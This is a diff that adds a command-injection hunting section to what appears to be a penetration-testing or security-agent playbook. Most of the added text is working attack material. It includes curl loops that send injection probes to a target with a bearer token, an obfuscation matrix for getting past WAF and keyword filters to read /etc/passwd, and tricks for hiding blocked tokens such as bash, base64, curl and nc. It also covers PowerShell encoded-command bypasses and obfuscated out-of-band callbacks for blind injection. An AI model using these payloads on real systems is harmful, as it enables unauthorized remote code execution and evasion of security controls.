@@ -488,6 +488,16 @@ SURFACE TYPES: ping/traceroute utilities, DNS lookup tools, any feature passing 
 
 ### SUB-PHASE 10.2: HUNT
 
+```
+ORDER: (1) timing oracle → (2) space bypass → (3) keyword bypass → (4) base64 →
+       (5) FILTER FINGERPRINT → (6) 11-technique shell-parser obfuscation matrix →
+       (7) chain-token trap → (8) layered stacking → (9) Windows/PS variants →
+       (10) payload mutation + OAST for blind sinks → (11) DOM analyzer gate
+SOURCE: wiki/exec-evasion (ExecEvasion toolkit, raw/ExecEvasion.md) — shell-parser-aware
+        WAF/filter evasion. Core: filters substring-match; shells remove quotes, expand
+        vars/globs/escapes. Filter sees `c''a''t` → shell runs `cat`.
+```
+
 **Timing-based:**
 ```bash
 CMDI_PAYLOADS=(
@@ -502,6 +512,115 @@ for payload in "${CMDI_PAYLOADS[@]}"; do
   python3 -c "t=float('$T'); exit(0 if t<4 else 1)" \
     || echo "[CMDI TIMING — CIA:RCE] $payload → ${T}s"
 done
+```
+
+**Space bypass:** {cat,/etc/passwd} | cat${IFS}/etc/passwd | cat</etc/passwd
+**Keyword bypass:** c\at /etc/passwd | c'a't /etc/passwd
+**Base64:** echo 'aWQ=' | base64 -d | sh
+
+**Filter fingerprint FIRST (before payload spray):**
+```bash
+# Submit obvious payload; the block/error message reveals WHICH substring/char is filtered.
+for probe in 'cat /etc/passwd' ';id' '|id' '$(id)' '`id`' 'cat${IFS}/etc/passwd'; do
+  RESP=$(curl -sk -X POST "$TARGET$ENDPOINT" -H "Content-Type: application/json" \
+         -H "Authorization: Bearer $TOKEN" -d "{\"$PARAM\":\"test $probe\"}")
+  echo "$probe → $(echo "$RESP" | grep -iEo 'blocked|dangerous|pattern|forbidden|waf' | head -1)"
+done
+# Classify filter: keyword blacklist / path blacklist / space block / char block / full-string block
+# Then feed the exact blocked strings into the generator and fire ONLY payloads that avoid them.
+```
+
+**11-Technique Shell-Parser Obfuscation Matrix (Linux) — filter class → payload:**
+```
+FILTER CLASS → TECHNIQUE(S)
+  keyword blacklist   → Glob [x] | Quote insertion | Backslash | Variable expansion
+  path blacklist      → Wildcards | Glob | Encoding
+  space block         → IFS | Brace expansion | tab/newline ($'\t' $'\n')
+  full command block  → Base64 | Hex ANSI-C | Concatenation
+  special char block  → Variable expansion | Encoding
+  $ allowed           → Variable expansion ($@ ${x} $() $*)
+  multi-command ok    → Concatenation into vars
+  nothing else works  → Hex $'...' (bash) | Base64 | Reverse+rev
+```
+```bash
+# GLOB [x] — single-char class resolves to that char (c[a]t = cat)
+curl -sk -X POST "$TARGET$ENDPOINT" -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" -d "{\"$PARAM\":\"; c[a]t /e[t]c/pass[w]d\"}"
+
+# QUOTE INSERTION '' / "" — adjacent empty strings concatenated (POSIX)
+# c''a''t /e''tc/p''asswd → shell: cat /etc/passwd
+
+# BACKSLASH \ — \c = c for letters; escapes every letter
+# \c\a\t /\e\t\c/\p\a\s\s\w\d → cat /etc/passwd
+
+# VARIABLE EXPANSION — empty vars between letters (requires $ allowed)
+# c$@at /etc/passwd | c${x}at /etc/passwd | c$()at /etc/passwd | ca$*t /etc/passwd
+# Reliability: $@ High, ${x} High, $() High, $* Medium
+
+# CONCATENATION — build command from vars, filter sees assignments only
+# a=cat;b=/etc/passwd;$a $b | v0=c;v1=a;v2=t;$v0$v1$v2 /etc/passwd
+
+# BASE64 — decode at runtime
+# echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh   (watch chain-token trap below)
+
+# HEX / ANSI-C $'...' — bash only; \xNN hex, \NNN octal
+# $'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
+# $'\143\141\164' /etc/passwd
+# echo -e "\x63\x61\x74 /etc/passwd"|bash | printf '%b' '\x63\x61\x74 /etc/passwd'|bash
+
+# WILDCARDS — /e*/passwd, /etc/p?sswd, /???/c?t /???/p?sswd
+# WARNING: expands to ALL matches — be specific enough to hit only the target file.
+
+# BRACE EXPANSION — space-free {cat,/etc/passwd}
+
+# REVERSE — echo '<reversed>'|rev|bash | bash -c "$(echo '<rev>'|rev)"
+
+# IFS — cat${IFS}/etc/passwd | cat$IFS/etc/passwd | IFS=_;cat_/etc/passwd
+#       cat$'\t'/etc/passwd | cat$'\n'/etc/passwd
+```
+
+**CHAIN-TOKEN TRAP (critical):**
+```
+Naive blocklists often ALSO block decoder/interpreter substrings: bash, sh, base64,
+python, perl, nc, curl, wget, /bin, /usr. So `echo X|base64 -d|bash` is blocked
+because it CONTAINS "bash" and "base64" even if your target command is clean.
+→ Obfuscate the decoder tokens too: b''ash / b[a]sh / ba''se''64 / b\x61se64
+→ Or switch decoders: hex via printf '%b' / $'...' / xxd -r instead of base64.
+→ Example working against the full blocklist above:
+  c''a''t /t''mp/fl''ag.txt   (breaks "cat" + "flag"; /tmp not blocked; no decoder tokens)
+```
+
+**Layered Stacking (combine techniques for hardened WAFs):**
+```bash
+# Glob + quotes:        c[a]''t /t''mp/fl[a]g.txt
+# Var + IFS:            c$@at${IFS}/t$()mp/fl$@ag.txt
+# Quote + backslash:    c\''a\''t /etc/passwd
+# Concatenated decoder: a="cat /tmp/flag.txt";b=$(echo $a|rev);echo $b|rev
+# Full hex (specials filtered): $'\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74'
+```
+
+**Windows / PowerShell variants (when target is a Windows backend):**
+```bash
+# CMD caret ^ :  w^h^o^a^m^i | who""ami | set v0=whoami&& call %v0%
+# CMD env substr: %COMSPEC:~0,1%=C %COMSPEC:~-7,1%=c %WINDIR:~3,1%=W ...
+# PS base64 (UTF-16LE! not ASCII): powershell -e <b64> | powershell -ep bypass -e <b64>
+# PS char codes: powershell -c "[char[]](119,104,111,97,109,105)-join''|iex"
+```
+
+**v3.3 HOOKS for CMDi:**
+```bash
+# Payload mutation — generate variants deterministically instead of guessing
+python3 mcp/payload_mutator.py --seed "cat /etc/passwd" --strategy url_encode_all
+python3 mcp/payload_mutator.py --seed "cat /etc/passwd" --strategy bypass_waf
+python3 mcp/payload_mutator.py --seed "c[a]t /etc/passwd" --all
+
+# Blind CMDi — obfuscate the OAST callback tokens too:
+# oast_generate { correlation_id: "cmdi_blind_endpoint" }
+# curl <oast>  →  c''url <oast>  |  cu[r]l <oast>  |  wge''t <oast>  |  n''c <oast> 80
+# fire payload → oast_poll for callback
+
+# DOM Analyzer gate before REPRODUCE (mandatory):
+# dom_analyze { control, true_condition, false_condition } → divergence MUST be true
 ```
 
 **Space bypass:** {cat,/etc/passwd} | cat${IFS}/etc/passwd | cat</etc/passwd
